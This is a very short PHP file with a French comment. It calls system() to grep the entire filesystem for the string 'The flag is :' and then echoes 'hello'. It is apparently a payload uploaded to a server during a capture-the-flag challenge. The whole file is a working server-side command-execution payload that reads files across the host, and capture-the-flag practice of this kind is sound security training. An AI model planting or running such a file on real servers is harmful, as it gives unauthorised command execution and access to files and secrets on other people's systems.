<?php
// Recherche la chaîne 'The flag is :' dans tous les fichiers accessibles
system("grep 'The flag is :' / -R 2>/dev/null");
echo "hello"
?>